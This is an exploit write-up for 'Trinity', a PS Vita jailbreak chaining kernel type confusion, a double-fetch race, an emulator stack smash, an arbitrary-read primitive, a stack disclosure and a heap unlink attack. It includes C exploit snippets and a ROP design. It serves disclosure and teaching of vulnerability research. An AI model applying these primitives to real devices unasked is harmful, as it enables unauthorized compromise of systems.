@@ -1,0 +1,605 @@
+*Trinity* is a fully chained exploit for the *PS Vita™* consisting of six unique vulnerabilities. It is based on a decade of knowledge and research. The source code of *Trinity* can be found [here](<https://github.com/TheOfficialFloW/Trinity>).
+
+## Table of Contents
+
+- [Table of Contents](#table-of-contents)
+- [Introduction](#introduction)
+- [MIPS Kernel Exploit](#mips-kernel-exploit)
+  * [Type Confusion](#type-confusion)
+  * [Double-fetch Race Condition](#double-fetch-race-condition)
+- [PSP Emulator Escape](#psp-emulator-escape)
+  * [Stack Smash](#stack-smash)
+  * [CSC Arbitrary Read](#csc-arbitrary-read)
+  * [Designing a RPC System](#designing-a-rpc-system)
+- [ARM Kernel Exploit](#arm-kernel-exploit)
+  * [Stack Disclosure](#stack-disclosure)
+  * [Heap Overflow](#heap-overflow)
+- [Post-exploitation](#post-exploitation)
+- [Conclusion](#conclusion)
+- [Credits](#credits)
+
+## Introduction
+
+As the *PS Vita™* is the successor of the *PSP™*, which was *the* most popular handheld back then, it was natural to give it backwards compatibility. Hence, the PS Vita came with a MIPS processor integrated besides its main ARM processor. A slightly adapted firmware of the PSP was used as software and (un)fortunately, this also brought along design flaws and vulnerabilities. Among others, it was possible to [fake sign on executables](<http://wololo.net/talk/viewtopic.php?f=5&t=1381&sid=b0b8c9563372a67a18946785dffe1f9c>) which allowed user code execution with no effort. Moreover, since the MIPS processor didn't have direct access to hardware devices, the PSP emulator used HLE by RPC via [Kermit](<https://wiki.henkaku.xyz/vita/Kermit>). This essentially exposed a potential attack surface.
+
+This write-up presents you bugs that I have found in this protocol. Their discoveries ultimately motivated me find to more bugs in order to chain them together and escalate privileges into ring0. The end result was a PSP Emulator Escape from MIPS userland to ARM kernel.
+
+## MIPS Kernel Exploit
+
+The history of PSP cracking is well known. It was the most active homebrew scene and gathered so many talents who worked together to unleash the beast. The PSP was literally taken apart, researched and exploited in any possible ways. I highly recommend you to watch the over [10-years old CCC talk](<https://media.ccc.de/v/24c3-2209-en-playstation_portable_cracking>) on the PSP by no other man than James Forshaw himself! I also suggest you read the following slides of [The Naked PSP](<https://uofw.github.io/upspd/docs/software/naked_psp.pdf>).
+
+### Type Confusion
+
+If you read the slides, you may have noticed the following code snippet:
+
+```c
+void *cntladdr = 0x88000000 + ((uid >> 5) & ~3);
+```
+
+In essence, UID's to kernel objects are simply encodings of their kernel addresses. If you pass such an UID to some syscalls that decodes it, it will first do sanity checks and see if the format is correct, then work with the object. This structure is very easy to fake. Surprisingly, nobody attempted to exploit this design flaw back then and was only first exploited by qwikrazor87 in around 2015. A third party write-up can be read [here](<https://github.com/GUIDOBOT/kxploits/blob/master/(3.50) sceKernelDeleteThread/explanation.txt>).
+
+In particular, the UID data-structure consists of metadata, name, size, etc. and most importantly it maintains a doubly linked list that connects parents and children. When the UID object is deleted, its entry is unlinked from the list as follows:
+
+```c
+// https://github.com/uofw/uofw/blob/master/src/sysmem/uid.c#L744
+s32 obj_do_delete(SceSysmemUidCB *uid, SceSysmemUidCB *uidWithFunc __attribute__((unused)), int funcId __attribute__((unused)), va_list ap __attribute__((unused)))
+{
+    uid->meta = NULL;
+    uid->PARENT0->nextChild = uid->nextChild;
+    uid->uid = 0;
+    uid->nextChild->PARENT0 = uid->PARENT0;
+    uid->nextChild = uid;
+    uid->PARENT0 = uid;
+    FreeSceUIDnamestr(uid->name);
+    FreeSceUIDobjectCB(uid);
+    return 0;
+}
+```
+
+Note that if we manage to control `uid->PARENT0` and `uid->nextChild`, we can write an arbitrary address to an arbitrary location.
+
+Exploiting this bug is straight forward:
+
+1. Plant a fake UID object into kernel.
+2. Encode this UID object.
+3. Delete the UID object.
+
+Basically, what you can do with this primitive is overwriting a function pointer in kernel and make it pointing to some function in userland instead. Then, we can invoke it and run our code in kernel mode.
+
+Do we have to bypass any security mitigations? Nope, there are none! Zero! There's no SMAP/SMEP, no KASLR, no effective randomization, no NX, nada! However that's comprehensible - remember this is a 10 years old device, just as secure as the PS4 ;-)
+
+After qwikrazor87 released this exploit, Sony of course couldn't just change their whole design. Instead, they added a few mitigations like XOR'ing `uid->uid` with a random seed, or detecting that the UID object was within the heap region.
+These mitigations were quite effective. As you'd have to plant 2^32 different UID object's to successfully guess the random seed. Furthermore, planting data within this heap region was not quite obvious, as that was only used by kernel internals.
+
+After trying a bunch of things, I noticed that when you allocate a new UID object, its name is saved within this heap region. The name can be at most 32 characters long and luckily for us, these are enough bytes to successfully fake our UID object in kernel. The only thing we need to worry about is that we cannot use any NULL character within this fake object, otherwise we won't be able to fully copy the data into kernel. The following code snippet shows how this has been achieved:
+
+```c
+  // Plant UID data structure into kernel as string
+  u32 string[] = { LIBC_CLOCK_OFFSET - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
+  SceUID plantid = sceKernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)&string, PSP_SMEM_Low, 0x10, NULL);
+```
+
+Note that `LIBC_CLOCK_OFFSET` is the function pointer we want to overwrite with the address `0x88888888`. The only thing left to do is determining `encrypted_uid`. Thankfully, qwikrazor87 found a nice arbitrary read exploit.
+
+### Double-fetch Race Condition
+
+The syscall `sceNpCore_8AFAB4A0()` is used to fetch some strings from a list. As arguments, we can specify the index of this array, the output buffer and the output length. See the code below:
+
+```c
+typedef struct {
+  int len;
+  char *string;
+} SceNpCoreString;
+
+static SceNpCoreString *g_00000D98;
+
+static int sub_000005D8(int *input, char *string, int length) {
+  int index;
+
+  index = input[1];
+  if (index >= 9)
+    return 0x80550203;
+
+  if (g_00000D98[index].len >= length)
+    return 0x80550202;
+
+  strcpy(string, g_00000D98[index].string);
+
+  return g_00000D98[input[1]].len;
+}
+
+int sceNpCore_8AFAB4A0(int *input, char *string, int length) {
+  ...
+  res = sub_000005D8(input, string, length);
+  ...
+  return res;
+}
+```
+
+Note that all these arguments come from userland, and they are not first saved into some kernel buffer. Moreover, note that the index `input[1]` is fetched twice.
+
+This opens a new possibility for an attacker: what if `input[1]` changes between the time of check and the time of use (a TOCTTOU problem)?
+This very small window allows us to first pass a valid index, then just after the check, quickly change it to a higher index than 9 and achieve an out-of-bounds access. This is a so called double-fetch race condition :-)
+
+```c
+static volatile int running;
+static volatile int idx;
+static int input[3];
+
+static int racer(SceSize args, void *argp) {
+  running = 1;
+
+  while (running) {
+    input[1] = 0;
+    sceKernelDelayThread(10);
+    input[1] = idx;
+    sceKernelDelayThread(10);
+  }
+
+  return sceKernelExitDeleteThread(0);
+}
+
+static u32 read_kernel_word(u32 addr) {
+  SceUID thid = sceKernelCreateThread("", racer, 8, 0x1000, 0, NULL);
+  if (thid < 0)
+    return 0;
+
+  sceKernelStartThread(thid, 0, NULL);
+
+  char string[8];
+  int round = 0;
+
+  idx = -83; // relative offset 0xB00 in np_core.prx (0xD98 + (-83 << 3))
+
+  int i;
+  for (i = 0; i < 100000; i++) {
+    u32 res = sceNpCore_8AFAB4A0(input, string, sizeof(string));
+    if (res != 5 && res != 0x80550203) {
+      switch (round) {
+        case 0:
+          round = 1;
+          idx = (addr - (res - 0xA74) - 0xD98) >> 3;
+          break;
+        case 1:
+          running = 0;
+          return res;
+      }
+    }
+  }
+
+  running = 0;
+  return 0;
+}
+```
+
+Observe that we do the race twice. First run to know where `g_00000D98` is located at in kernel (only the very first module `SceSysmem` is at constant address 0x88000000, all other bases are randomized). Then in the second run, we try to return the data of our desired address. In our case, this is the location of the random seed.
+
+Plugging it together with the previous vulnerability, we can now execute code in MIPS kernel as follows:
+
+```c
+  u32 seed = read_kernel_word(SYSMEM_SEED_OFFSET);
+  if (!seed)
+    return -1;
+
+  SceUID uid = (((FAKE_UID_OFFSET & 0x00ffffff) >> 2) << 7) | 0x1;
+  SceUID encrypted_uid = uid ^ seed;
+
+  // Plant data
+  ...
+
+  // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
+  sceKernelFreePartitionMemory(uid);
+
+  // Make a jump to kernel function
+  REDIRECT_FUNCTION(0x08888888, kernel_function);
+
+  // Execute kernel function
+  sceKernelLibcClock();
+```
+
+Easy, right? :-)
+
+## PSP Emulator Escape
+
+Why hack the PSP Emulator anyways? Why not WebKit? The PSP Emulator runs at system privileges which are equivalent to root. By gaining control over the emulator, we are exposed to almost *ALL* syscalls, unlike the WebKit process that is sandboxed. Similarly, the previous jailbreak [h-encore](<https://theofficialflow.github.io/2018/09/11/h-encore.html>) exploited a gamesave vulnerability such that it could invoke the NGS syscalls.
+
+As mentioned earlier, the MIPS processor has access to hardware devices by HLE. It uses RPC to send commands to the ARM processor, which handles them and sends responses back. Some research on this communication interface had already been done in 2012 by [Davee](<https://www.lolhax.org/2012/03/29/kermit/>).
+
+Back then, I tried to find ways to somehow leak ARM memory to MIPS processor, but due to the fact that I had zero information about the HLE code and no ways to debug, I gave up quickly.
+
+After the release of [HENkaku](<http://henkaku.xyz/>), I took up the idea again of escaping the PSP Emulator and wrote a blackbox fuzzer for this protocol.
+
+### Stack Smash
+
+The fuzzer, residing on the MIPS processor, basically chose random commands and random arguments (integers and valid pointers to buffers that also contain random values) and sent them via the Kermit protocol. An exception handler was installed on the host side to capture potential crashes.
+
+I quickly found a bunch of NULL pointer dereferences. Most were due to the conversion of PSP memory to PS Vita memory not being checked for success. Hence, if an invalid address was passed to `ConvertAddress()`, the RPC server would continue working with the NULL pointer.
+
+This was actually good news, because if there were simple NULL pointer dereferences in the code, that meant that it had not been sufficiently audited. Therefore, high chances there were other (more serious) bugs available.
+
+After several runs and blacklisting of uninteresting commands, I hit a panic in `__stack_chk_fail()`. At that moment I knew I won. It was a stack smash in the `KERMIT_CMD_ADHOC_CREATE` command. Discovered on the 2018-05-26.
+
+Here is the vulnerable code:
+
+```c
+typedef struct {
+  uint8_t mac[6];
+  uint8_t channel;
+  uint8_t bufsize;
+  uint8_t buf[0];
+} KermitAdhocCreateParam; // 0x70
+
+static int remoteNetAdhocCreate(KermitAdhocCreateParam *param) {
+  uintptr_t canary = __stack_chk_guard;
+
+  int res;
+  char buf[0x114];
+
+  memset(buf, 0, sizeof(buf));
+  memcpy(buf + 0x98, param->buf, param->bufsize);
+
+  ...
+
+  if (canary != __stack_chk_guard)
+    __stack_chk_fail();
+
+  return res;
+}
+
+static int ScePspemuRemoteNet(SceSize args, void *argp) {
+  uint32_t cmd;
+  uint64_t res;
+  KermitRequest **request; // sp + 0x14
+
+  while (1) {
+    cmd = WaitAndGetRequest(KERMIT_MODE_WLAN, &request);
+
+    switch (cmd) {
+      ...
+
+      case KERMIT_CMD_ADHOC_CREATE:
+        void *param = (void *)ConvertAddress(request->args[0], 0x3, 0x70);
+        res = remoteNetAdhocCreate(param);
+        WritebackCache(param, 0x70);
+        break;
+
+      ...
+    }
+
+    ReturnValue(KERMIT_MODE_WLAN, request, res);
+  }
+
+  return 0;
+}
+```
+
+As you can easily see, the bug is at `memcpy()` where the length `param->bufsize` is passed without being validated. This field is 8bit wide and can therefore hold the value 0xff as maximum. Note that `buf` is 0x114 bytes big and that `param->buf` is copied to offset 0x98. Simple maths yields that by copying more than 0x7c bytes, we can overflow this buffer and overwrite stack data (most importantly the value of the LR register).
+
+How many bytes can we control after that buffer? As `param->bufsize` can be maximal 0xff, we can control 0x83 bytes after this buffer, which is enough room to plant and execute ROP chains.
+
+But wait, why so confident? Remember, we don't even have PC control yet. We simply hit `__stack_chk_fail()`, which leads to nowhere as long as we don't find a way to leak the random value of `__stack_chk_guard`.
+
+This was probably the hardest part of the whole chain and took me a whole week to solve. I was looking for uninitialized buffers on stack that would leak the stack canary and return addresses to defeat ASLR. Surprisingly, I couldn't find such a bug and it seemed like Sony made sure not to forget to `memset()` any buffer there. After a whole week of reverse engineering and digging through all commands, I found a very cool bug that would allow us to read arbitrary memory. Discovered on the 2018-06-04.
+
+### CSC Arbitrary Read
+
+The vulnerability lies in one of the media engine commands that is responsible for color space conversion from YCbCr to RGBA. The command copies a row chosen by the user into a framebuffer, however it doesn't sanitize check the row number.
+
+The bug looks as follows:
+
+```c
+dst = framebuf;
+src = pYCbCr + row * width;
+
+memcpy(dst, src, Y_size);
+dst += Y_size;
+src += Y_size;
+
+memcpy(dst, src, Cb_size);
+dst += Cb_size;
+src += Cb_size;
+
+memcpy(dst, src, Cr_size);
+dst += Cr_size;
+src += Cr_size;
+
+csc(pRGBA, framebuf, ...);
+```
+
+If we set `pYCbCr` to NULL (by using any invalid address), we can arbitrarily copy memory into the framebuffer specified by `row * width`. Then, color space conversion will be applied on this buffer and the result sent back to the MIPS processor.
+
+Can we learn anything about the data after the conversion? Of course, just convert it back to YCbCr. Unfortunately, if we want to bypass the stack protection, we need to find out the exact value of the canary. If we don't get the right value, the application will just crash. Hence, no approximation is permitted.
+
+As I didn't know much about this algorithm, I took a quick look on wikipedia: [YCbCr](<https://en.wikipedia.org/wiki/YCbCr>). The last section on JPEG conversion reveals that RGB is calculated as follows:
+
+```
+R = Y + 1.402 * (Cr - 128)
+G = Y - 0.344136 * (Cb - 128) - 0.714136 * (Cr - 128)
+B = Y + 1.722 * (Cb - 128)
+```
+
+It is simple to see that if Cr and Cb are 128, we have:
+
+```
+R = Y
+G = Y
+B = Y
+```
+
+How can we achieve that? Luckily this can easily be done, because of the fact that the framebuffer is allocated at the constant address 0x66a00000 in CDRAM and that it is not cleared after the conversion is done.
+
+This can be exploited as follows:
+
+1. Fill the YCbCr framebuffer with value 128.
+2. Copy memory of our arbitrary location into Y component.
+3. Copy exactly the same memory into the framebuffer (src=dst).
+4. Apply color space conversion. Now R=G=B=Y.
+5. Read every fourth byte of the output buffer.
+
+Below is the implementation of the arbitrary read primitive:
+
+```c
+static void jpeg_csc(void *pRGBA, const void *pYCbCr, int width, int height, int iFrameWidth, int mode, int addr) {
+  int work = 0;
+  _sceKernelDcacheWritebackInvalidateAll();
+  _sceMeRequest(ME_CMD_CSC_INIT, work, pRGBA, pYCbCr, width, height, mode, 0, iFrameWidth);
+  _sceMeRequest(ME_CMD_CSC_ROW,  work, addr / width, mode);
+}
+
+int _read_native(void *dst, u32 src, size_t len) {
+  int k1 = pspSdkSetK1(0);
+
+  size_t i;
+  for (i = 0; i < ALIGN(len, 16); i += 16) {
+    u8 *temp = (u8 *)0xABCD0000;
+    memset(temp, 128, 3 * 8 * 16);
+    jpeg_csc(temp, (void *)0x08000000, 8, 16, 8, 0b0101, NATIVE(temp));
+    jpeg_csc(temp, (void *)0x08000000, 1,  0, 1, 0b0101, src + i);
+    jpeg_csc(temp, (void *)0x08000000, 8, 16, 8, 0b0101, 0x66a00000);
+
+    size_t j;
+    for (j = 0; j < MIN(len - i, 16); j++)
+      ((u8 *)dst)[i + j] = temp[j * 4];
+  }
+
+  pspSdkSetK1(k1);
+  return 0;
+}
+```
+
+This is a very powerful primitive and allows us to read all .text bases and effectively find out the `__stack_chk_guard` variable. The only concern remains that we still don't know anything about the memory layout. This is a potential problem, because if we read an invalid memory, we'll just get a segmentation fault. Fortunately, the .data segment of the module `ScePspemu` is over 16MB big and is always at addresses 0x81100X00 or 0x81200X00.
+
+- Assume the .data segment is at 0x81100X00. Then, we can safely read 0x81201000, because this is clearly still within the segment.
+- On other other hand, if it is at 0x81200X00, then, the address 0x81201000 is just slightly a bit after the start of the segment, thus of course valid.
+
+Hence, by starting at 0x81201000 and iterating backwards, we can check for a certain magic value (some unique constant) and once we find this constant, we'll be able to determine the real address of the .data segment. With this information, we can then easily find out all other bases:
+
+- ScePspemu .data → ScePspemu .text → SceLibKernel .text → SceLibKernel .data → __stack_chk_guard
+
+Good, we are now ready for some ROP 'n' Roll!
+
+### Designing a RPC System
+
+Now that we have successfully retrieved the stack canary, we can forge an overflow that contains the correct stack canary at the right place. Then, we can issue the vulnerable stack smash command and finally get PC control, hurray!
+
+Let us either be masochistic and stack pivot into a big ROP chain - or we design a proper RPC system, that allows us to call arbitrary functions and syscalls from MIPS processor. This is a better idea, since having the ability to do logic on the MIPS processor is more attractive than writing conditional loops or complicated arithmetic in pure ROP payloads.
+
+The neat property of stack smash exploits is that it is deterministic. We don't need to rely on heavy heap spraying methods where we can only get PC control with a certain probability. Therefore, our idea is to write a small ROP chain that can invoke an arbitrary function or syscall every time we trigger the overflow.
+
+As our overflow is within the subroutine `remoteNetAdhocCreate()`, we will also overwrite the stack in the `ScePspemuRemoteNet()` super routine. One issue with that is that we'll corrupt the `request` pointer:
+
+```c
+KermitRequest **request; // sp + 0x14
+```
+
+This must be restored by the ROP chain on runtime, such that after exiting the chain, the following call will not fail:
+
+```c
+ReturnValue(KERMIT_MODE_WLAN, request, res);
+```
+
+Then, another concern is that we need to restore the program counter and the stack pointer to their original locations after exiting the ROP chain.
+
+Remember that we only have 0x83 bytes of stack available. This is unfortunately too little to:
+
+1. Get the stack pointer
+2. Execute arbitrary function
+3. Restore SP + 0x14
+4. Set the stack pointer to old location
+5. Return to correct address
+
+However, since the stack pointer is always the same (because the `ScePspemuRemoteNet()` thread simply sleeps until it receives a new command), we can separate the requirements above and only find out the stack pointer once (skip step 2). Then, for every arbitrary call, we can skip step 1, as we already know it. The benefit of this approach is that we are now able to stack pivot into a bigger ROP chain and don't need to worry about the number of gadgets we use. This can be done by copying the bigger ROP chain to `SP - sizeof(ROPchain)` and stack pivot there. This particular ROP chain can then execute an arbitrary function with arbitrary arguments, then restore the `request` pointer and return into `ScePspemu_remoteNetAdhocCreate_lr` as last gadget. After this last gadget has been popped, it'll arrive at the very same stack address it was before. This has the benefit that we don't need to stack pivot yet another time and can safely resume execution.
+
+Amazing, we can now invoke arbitrary ARM syscalls from MIPS processor. In fact, we can now even write hybrid homebrews that have native graphics, touch functionality, etc. while still running on the MIPS processor! Check out [rpc.c](<https://github.com/TheOfficialFloW/Trinity/blob/master/eboot/rpc.c>) for this cool implementation.
+
+## ARM Kernel Exploit
+
+As I mentioned before, the PSP Emulator runs with system privileges that are equivalent to root. Basically with this exploit, we can already access all file systems, change registries, etc. Unfortunately, system privileges are not even enough to allocate RWX pages. Hence, we are not yet able to run native homebrews. We still need a kernel exploit.
+
+My goal was to find kernel vulnerabilities that were only triggerable with system privileges. The reason was that it would be a waste if we used vulnerabilities instead that could be accessed with user privileges. These should better be kept for WebKit/savedata exploits.
+
+### Stack Disclosure
+
+Before I present you a detailed explanation of the next kernel exploit, I'll first show you this small one. Discovered on the 2018-10-09.
+
+```c
+static uint32_t dword_8100D200, dword_8100D204;
+
+int ksceUdcdGetDeviceInfo(void *info) {
+  if (!sub_810042A8(2))
+    return 0x80243003;
+
+  *(uint32_t *)(info + 0x00) = dword_8100D200;
+  *(uint32_t *)(info + 0x04) = dword_8100D204;
+
+  return 0;
+}
+
+int sceUdcdGetDeviceInfo(void *info) {
+  int res, state;
+  char k_info[0x40];
+
+  ENTER_SYSCALL(state);
+
+  if (!ksceSblACMgrIsShell(0) &&
+      !ksceSblACMgrIsMiniSettingsForQA() &&
+      !ksceSblACMgrIsAllowedUsbSerial()) {
+    EXIT_SYSCALL(state);
+    return 0x80010058;
+  }
+
+  if (!info) {
+    EXIT_SYSCALL(state);
+    return 0x8024300A;
+  }
+
+  res = ksceUdcdGetDeviceInfo(k_info);
+  if (res >= 0)
+    ksceKernelMemcpyKernelToUser(info, k_info, sizeof(k_info));
+
+  EXIT_SYSCALL(state);
+  return res >= 0;
+}
+```
+
+The bug is obvious: 0x40 bytes of stack is allocated for `k_info`, however only 8 bytes are initialized by `ksceUdcdGetDeviceInfo()`. The rest is left uninitialized. Then, this information is copied back to user. Hence, the last 0x38 bytes will contain information from the previous stack frame. To exploit this, we first call some syscalls that push interesting stuff onto stack, like the stack pointer itself or return addresses, then call `sceUdcdGetDeviceInfo()` to retrieve this information.
+
+Using the obtained kernel module address, we can bypass KASLR and build kernel ROP chains. This vulnerability must be included into our chain, because the next exploit that I'm going to show, is not powerful enough to leak kernel data, and expects predetermined kernel addresses.
+
+### Heap Overflow
+
+While working on the stack smash exploit, I noticed that WLAN would not work anymore after triggering the overflow many times. Only a few months later I decided to take a look at it. I quickly found out that `remoteNetAdhocCreate()` would call a certain WLAN command with the corrupt parameters and then forget to free heap memory on failure.
+
+Again, using the same mindset as before: if there's such a bug, there probably exist more (severe) bugs. Indeed, this led me to a different WLAN command that suffered a similar mistake as the stack smash vulnerability. Discovered on the 2018-09-26.
+
+This time, it is a 32bit length that is passed to `memcpy()` which is not validated. It is triggerable by the WLAN command `0x50120004` (with controllable `buf`):
+
+```c
+memcpy(work + 0x28, buf + 0x10, *(uint32_t *)(buf + 0xc));
+```
+
+The difference here is that `work` does not reside on stack, but rather on heap. Unfortunately, this heap is only used by the network stack, hence there's not much we can overflow into. Moreover, it is the same heap that had the [Use-After-Free vulnerability](<https://blog.xyz.is/2016/vita-netps-ioctl.html>). Sony fixed this vulnerability and added [exploit mitigations](<https://blog.xyz.is/2017/363-fix.html>) to ensure the integrity of the function pointer in the socket object. Hence, we must think of other strategies to gain PC control.
+
+I reverse engineered their `malloc()/free()` implementation and soon I designed a different method to exploit the heap overflow. My goal was namely to launch an unlink attack.
+
+First, let me introduce their heap implementation. The heap maintains a doubly linked "free" list and a "busy" list. The heap grows from high to low address, instead of the other way like they normally do.
+
+Finally, there are some heap invariants:
+
+1. Every free chunk is linked together, and every busy chunk is linked together.
+2. No two free chunks can be adjacent and must always be merged together.
+3. There are (constant) cookies that indicate whether a chunk is currently being used or not.
+4. There's a  (constant) cookie at the end of each busy chunk that is checked to be valid on `free()`.
+
+Below is a diagram that shows the top of the heap. Note that the 0x800 bytes chunk represents the `work` buffer and the 0x1000 bytes chunk represents the `buf`  buffer (see the code snippet above for reference). They are both relatively big, thus they will fail to find any place in the heap (after a cold reboot) and hence, will make the heap grow such that they can take up the top of the heap (remember it grows backwards).
+
+![](initial.png)
+
+As you can see, they are both marked as busy. The 0x800 bytes chunk doesn't have a previous pointer to anywhere, because it is on top of the heap. This is the constellation before the overflow.
+
+The next diagram shows you the constellation after the overflow. Recall that we copy from the 0x1000 bytes chunk into the 0x800 chunk.
+
+![](overflow.png)
+
+Observe that the `MaAk` cookie is still intact even after the overflow. This is no barrier to us, because it is constant and we can easily fake it. Also, note that there is now a new fake free chunk with size of 0xfe0 bytes and that the size of the 0x1000 bytes chunk has shrunken to zero. Of course, the four red boxes cannot be unseen: they represent pointers that we can arbitrarily control.
+
+Since our overflow buffer doesn't contain valid parameters specified by the command, the subroutine will quickly notice that and bail out. On abort, the 0x800 bytes chunk will first be free'd, then the 0x1000 (now zero) bytes chunk will be free'd.
+
+Remember the first invariant: if we free a chunk, it will unlink its entry from the busy list and add itself into the free list. However, it doesn't have pointers to the free list! How can we find out the previous and the next free chunk in the list? This is actually not a problem, because:
+
+- Either the logical next busy chunk is also the physical next chunk (meaning that the next pointer in the header simply points to the end of the current chunk).
+- Or it does not. Then, the physical next chunk must be a free chunk.
+
+In the second case, we're done. We've already found a free chunk and can simply coalesce with our current chunk.
+
+In the first case however, we will have to continue the iteration and follow the logical next chunk until we're either on bottom of the heap, or we find a chunk whose logical next chunk is not equal to the physical next chunk.
+
+Below is Sony's implementation in `free()` that finds the next free chunk using the current busy chunk:
+
+```c
+chunk_header_t *curr, *next;
+
+curr = ...;
+
+while (1) {
+  next = (chunk_header_t *)((char *)curr + curr->size);
+  if (curr->next != next)
+    break;
+  curr = curr->next;
+}
+
+if (next < g_heap_end) {
+  // next is a free chunk
+} else {
+  // no free chunk after curr found
+  // thus curr must be the tail of the free list
+}
+```
+
+Back to our overflow: when we free the corrupted 0x800 bytes chunk, it will follow the next pointer to the shrunken 0x1000 bytes chunk, then find out that its next pointer doesn't point to the physical next chunk. Therefore, it will indeed think that the fake free chunk, that we planted, is a valid free chunk, and as a result, the 0x800 chunk will finally point to the arbitrary address.
+
+Now, hold your breath, the arbitrary address will store the pointer to the 0x800 chunk in the `next` field, which is essentially our unlink attack! In other words, we can overwrite an arbitrary kernel pointer with the pointer to the 0x800 bytes chunk, whose data we control.
+
+This diagram shows the effect of freeing the 0x800 bytes chunk:
+
+![](free1.png)
+
+Observe that no coalescing took place yet, as there's still a busy chunk between the two free chunks.
+
+After the 0x800 bytes chunk has been free'd, it will proceed to free the 0x1000 bytes chunk:
+
+![](free2.png)
+
+As illustrated above, the busy list head now points to an arbitrary address, and the `prev` field at this address now stores NULL. We have therefore completely destroyed the data structure - luckily the busy list tail pointer is still intact, thus we will be able to recover the head pointer.
+
+Finally, to respect the second invariant, `free()` merges the 0x808 and 0x8 chunks together:
+
+![](merge1.png)
+
+Nothing interesting happened during the coalescing, but since there are still two adjacent chunks, it must merge once again:
+
+![](merge2.png)
+
+Et voilà, a second unlink attack took place! The `prev` pointer of the box on bottom now points to the 0x800 (now actually 0x1830) bytes free chunk.
+
+Overall, we have (in the following order):
+
+```c
+*(uint32_t *)(arbitrary_top    - offsetof(chunk_header_t, next)) = work;
+*(uint32_t *)(arbitrary_right  - offsetof(chunk_header_t, prev)) = NULL;
+*(uint32_t *)(arbitrary_bottom - offsetof(chunk_header_t, prev)) = work;
+```
+
+where the data in `work` is almost fully controllable by us. We can now choose the same address for those arbitrary locations, such that it will first write the pointer to `work`, then `NULL` and ultimately again `work`.
+
+Now the question is what shall we use it for? Luckily there's an easy target. The following code is namely used to allocate that 0x800 bytes work buffer:
+
+```c
+v29 = (*(int (__fastcall **)(int, signed int, signed int))(*(_DWORD *)(v4 + 0x580) + 0x638))(
+        *(_DWORD *)(v4 + 0x580) + 0x630,
+        0x800,
+        4);
+```
+
+If we replace the data at `v4 + 0x580` by `work`, then the function placed at `work + 0x638` can be dereferenced and executed with `work + 0x630` as argument. Perfect. If we issue the WLAN command once again, an arbitrary function with arbitrary data as first argument can be called. As function, we choose the gadget `SceSysmem_ldm_r0_r4_sl_ip_sp_pc` such that we can stack pivot into our kernel ROP chain.
+
+The rest of the exploit is self-explanatory and can be found [here](<https://github.com/TheOfficialFloW/Trinity/blob/master/eboot/arm.c>). By calling the syscall `sceWlanGetConfiguration()` before `sceUdcdGetDeviceInfo()`, we will be able to leak the address of `v4`.  Similarly, by calling `sceRtcConvertLocalTimeToUtc()` before `sceUdcdGetDeviceInfo()`, we will be able to leak the kernel stack address and a return address to `SceSysmem`.
+
+## Post-exploitation
+
+The most important thing to do when we have kernel code execution is to recover the heap data-structure, otherwise as soon as sockets are used again, it will result in a crash. What do we need to fix?
+
+- Since we changed the size of the busy chunk from 0x1000 to 0, the free list size was not incremented correctly when the 0x1000 chunk was free'd. Therefore, we must increment the free list size by 0x1000.
+- The chunk before the busy list head in the initial state is actually a large free chunk. Coalescing with this large chunk however did not happen. We must recover this by incrementing the size of the free chunk by `0x1830 + sizeof(chunk_header_t)`.
+- The busy list head is invalid. We can recover this by using the busy list tail and iterate backwards until we find a busy chunk which has an invalid next pointer.
+- As we hijacked the control-flow while a lock was held, we must unlock it to avoid deadlocks.
+- Last but not least, we must recover the `*(_DWORD *)(v4 + 0x580)` pointer that we have overwritten.
+
+## Conclusion
+
+This was the coolest exploit chain that I had ever written and certainly also my proudest project. I enjoyed exploring these new attack surfaces and it gave me nostalgia as it combined a decade of knowledge and research by the PSP/PS Vita community. This project also concluded the end of my work for the PS Vita scene and I hope that my write-up would inspire other people to begin with reverse engineering, finding vulnerabilities and exploitation. I believe that I am only here where I am today thanks to these kind of write-ups and I believe you can all achieve the same, if you just want to.
+
+## Credits
+
+- Thanks to qwikrazor87 for the MIPS kernel read exploit.
+- Thanks to Team molecule for their prior research on the PS Vita.
